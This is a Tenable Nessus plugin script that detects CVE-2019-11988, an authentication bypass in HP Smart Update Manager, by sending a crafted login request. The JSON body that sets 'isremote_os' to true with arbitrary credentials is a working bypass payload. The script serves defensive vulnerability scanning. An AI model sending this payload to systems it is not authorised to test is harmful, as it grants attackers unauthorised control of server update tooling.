#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(128768);
  script_version("1.3");
  script_set_attribute(attribute:"plugin_modification_date", value:"2020/02/24");

  script_cve_id("CVE-2019-11988");
  script_xref(name:"HP", value:"HPESBMU03922");

  script_name(english:"HP Smart Update Manager Remote Unauthorized Access.");

  script_set_attribute(attribute:"synopsis", value:
"A software/firmware update application running on the remote is
affected by an authentication bypass vulnerability.");
  script_set_attribute(attribute:"description", value:
"The HPE Smart Update manager running on the remote host is affected
by an authentication bypass vulnerability. An unauthenticated, remote
attacker can exploit this, via a specially crafted request, to bypass
authentication and execute arbitrary actions defined by the
application.");
  # https://support.hpe.com/hpsc/doc/public/display?docLocale=en_US&docId=emr_na-hpesbmu03922en_us
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?0a459a70");
  script_set_attribute(attribute:"solution", value:
"Upgrade to HP Smart Update Manager 8.3.5 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2019-11988");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2019/05/31");
  script_set_attribute(attribute:"patch_publication_date", value:"2019/05/31");
  script_set_attribute(attribute:"plugin_publication_date", value:"2019/09/13");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:hp:smart_update_manager");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2019-2020 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("hp_sum_detect.nbin");
  script_require_keys("installed_sw/HP Smart Update Manager");
  script_require_ports("Services/www", 63001, 63002);

  exit(0);
}

include('audit.inc');
include('global_settings.inc');
include('misc_func.inc');
include('install_func.inc');
include('http.inc');

appname = 'HP Smart Update Manager';

# Exit if app is not detected
get_install_count(app_name:appname, exit_if_zero:TRUE);

# Service may be marked as broken, so don't use get_http_port
port = get_kb_item_or_exit('Services/www');

# Exit if app is not detected on this port
get_single_install(app_name:appname, port:port);

# Attack vector via https only
if (get_port_transport(port) == ENCAPS_IP)
  exit(0, 'Skipped testing non-https port ' + port + '.');

# Perform the auth bypass with "isremote_os":true
url = '/session/create';
data = '{"hapi":{"username":"any_user","password":"any_password","isremote_os":true,"language":"en","mode":"gui","settings":{"output_filter":"passed","port_number":"444"}}}';
 
res = http_send_recv3(
  method : 'POST',
  port   : port,
  item   : url,
  data   : data,
  content_type  : 'application/json',
  exit_on_fail : TRUE
);
if('200' >< res[0] &&
 res[2] =~ '"hapi".*"hcode"\\s*:\\s*0' &&
 res[2] =~ '"hapi".*"sessionId"\\s*:\\s*"\\s*t')
{
  out = preg_replace(string:res[2], pattern:'"sessionId"\\s*:\\s*"\\D\\w+"',replace: '"sessionId":"<REDACTED>"');
  security_report_v4(
    port       : port,
    generic    : TRUE,
    severity   : SECURITY_HOLE,
    request    : make_list(http_last_sent_request()),
    output     : out
  );
}
# Seen 404 on patched server
else if ('404' >< res[0])
  audit(AUDIT_LISTEN_NOT_VULN, 'HPE Smart Update Manager', port);
# Unexpected
else
{
  r = res[2];
  if(strlen(r) > 128)
    r = substr(r, 0, 127) + '(truncated...)';
  audit(AUDIT_RESP_BAD, port, 'a login request. HTTP response: \n' + r);
}
